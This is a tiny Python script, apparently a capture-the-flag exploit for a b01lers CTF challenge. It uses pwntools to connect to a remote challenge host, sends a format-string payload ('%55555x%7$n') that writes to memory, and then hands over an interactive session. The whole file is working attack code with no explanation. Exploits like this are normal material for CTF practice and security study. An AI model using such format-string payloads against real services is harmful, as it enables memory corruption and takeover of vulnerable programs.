from pwn import *

p=remote("pwn.ctf.b01lers.com", 1004)




p.sendline("%55555x%7$n")
p.interactive()




